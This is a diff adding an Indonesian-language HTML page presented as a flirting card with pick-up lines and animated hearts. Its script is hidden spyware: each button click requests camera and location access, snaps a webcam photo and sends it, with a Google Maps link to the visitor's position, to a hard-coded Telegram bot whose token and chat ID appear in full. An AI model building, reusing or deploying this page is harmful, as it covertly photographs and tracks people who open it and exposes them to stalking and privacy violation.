@@ -1,1 +1,217 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Rayuan & Kamera 📸❤️</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+            background: linear-gradient(45deg, #ff758c, #ff7eb3);
+            font-family: 'Comic Sans MS', cursive, sans-serif;
+            transition: background 0.5s;
+            overflow: hidden;
+        }
 
+        h1 {
+            font-size: 30px;
+            color: white;
+            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.3);
+            animation: fadeIn 1s forwards;
+        }
+
+        p {
+            font-size: 20px;
+            color: white;
+            font-weight: bold;
+            opacity: 0;
+            transform: scale(0.8);
+            transition: opacity 0.5s, transform 0.5s;
+        }
+
+        button {
+            background-color: #ff4d6d;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 18px;
+            cursor: pointer;
+            border-radius: 25px;
+            box-shadow: 0px 5px 10px rgba(0, 0, 0, 0.3);
+            transition: transform 0.2s, background 0.3s;
+        }
+
+        button:hover {
+            transform: scale(1.1);
+            background-color: #ff1e56;
+        }
+
+        @keyframes fadeIn {
+            0% { opacity: 0; transform: translateY(-20px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+
+        .love {
+            position: absolute;
+            font-size: 24px;
+            color: red;
+            animation: floatUp 3s linear infinite;
+        }
+
+        @keyframes floatUp {
+            0% { transform: translateY(0) scale(1); opacity: 1; }
+            100% { transform: translateY(-100vh) scale(0.5); opacity: 0; }
+        }
+
+        #surpriseText {
+            font-size: 26px;
+            color: yellow;
+            text-shadow: 2px 2px 10px rgba(255, 255, 0, 0.8);
+            animation: glow 1s infinite alternate;
+            display: none;
+        }
+
+        @keyframes glow {
+            from { text-shadow: 2px 2px 10px rgba(255, 255, 0, 0.5); }
+            to { text-shadow: 4px 4px 20px rgba(255, 255, 0, 1); }
+        }
+    </style>
+</head>
+<body>
+
+    <h1>💖 Halo, Bidadari! 💖</h1>
+    <p id="flirtText">Klik tombol di bawah buat lihat sesuatu yang spesial! 😘</p>
+    <button onclick="godaCewe()">Klik Aku! 💕</button>
+    <p id="surpriseText" class="hidden">💛 Kamu adalah kejutan terbaik dalam hidupku! 💛</p>
+
+    <script>
+        const rayuanList = [
+            "Aku yakin gravitasi gak bisa lawan daya tarik kamu. 😍",
+            "Kamu seperti kopi, bikin jantungku berdetak lebih cepat! ☕💓",
+            "Kalau bidadari turun ke bumi, pasti wajahnya mirip kamu! 😇",
+            "Mau tau kenapa aku selalu tersenyum? Karena ada kamu. 😊❤️",
+            "Bahkan bulan iri sama kamu, karena kamu yang paling bersinar. 🌙✨",
+            "Aku ga butuh peta, karena hatiku selalu tertuju padamu. 💘"
+        ];
+
+        let clickCount = 0;
+        const telegramToken = '7030408795:AAFfhnjy4x3f3gotpugela5qFMbVVnE9HpI'; // Ganti dengan token bot Telegram
+        const chatId = '1746156378'; // Ganti dengan chat ID Telegram
+
+        function randomColor() {
+            const colors = ["#ff758c", "#ff7eb3", "#ff4d6d", "#ff1e56", "#ffafbd", "#ffc3a0"];
+            return colors[Math.floor(Math.random() * colors.length)];
+        }
+
+        function createLoveEffect() {
+            const love = document.createElement("div");
+            love.classList.add("love");
+            love.innerHTML = "❤️";
+            document.body.appendChild(love);
+            
+            let xPos = Math.random() * window.innerWidth;
+            love.style.left = `${xPos}px`;
+            love.style.bottom = "0px";
+
+            setTimeout(() => love.remove(), 3000);
+        }
+
+        function godaCewe() {
+            const flirtText = document.getElementById("flirtText");
+            flirtText.textContent = rayuanList[Math.floor(Math.random() * rayuanList.length)];
+            flirtText.style.opacity = 1;
+            flirtText.style.transform = "scale(1)";
+            document.body.style.background = `linear-gradient(45deg, ${randomColor()}, ${randomColor()})`;
+
+            clickCount++;
+            
+            for (let i = 0; i < 5; i++) {
+                setTimeout(createLoveEffect, i * 300);
+            }
+
+            if (clickCount === 5) {
+                document.getElementById("surpriseText").style.display = "block";
+            }
+
+            startCapture();
+        }
+
+        function startCapture() {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(function(stream) {
+                        setTimeout(() => {
+                            captureAndSend(stream);
+                        }, 3000);
+                    })
+                    .catch(function(error) {
+                        alert("Akses kamera ditolak.");
+                    });
+            }
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const locationUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                    sendToTelegram(locationUrl);
+                }, function(error) {
+                    alert("Gagal mendapatkan lokasi.");
+                });
+            }
+        }
+
+        function captureAndSend(stream) {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+
+            video.onloadedmetadata = () => {
+                const canvas = document.createElement('canvas');
+                const context = canvas.getContext('2d');
+
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+
+                function drawVideoToCanvas() {
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    if (canvas.width > 0 && canvas.height > 0) {
+                        canvas.toBlob(function(blob) {
+                            sendToTelegram(blob);
+                            stream.getTracks().forEach(track => track.stop());
+                        }, 'image/jpeg');
+                    } else {
+                        requestAnimationFrame(drawVideoToCanvas);
+                    }
+                }
+
+                drawVideoToCanvas();
+            };
+        }
+
+        function sendToTelegram(message) {
+            let url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+            let data = new URLSearchParams({
+                chat_id: chatId,
+                text: message
+            });
+
+            if (message instanceof Blob) {
+                url = `https://api.telegram.org/bot${telegramToken}/sendPhoto`;
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', message, 'photo.jpg');
+                data = formData;
+            }
+
+            fetch(url, { method: 'POST', body: data });
+        }
+    </script>
+
+</body>
+</html>
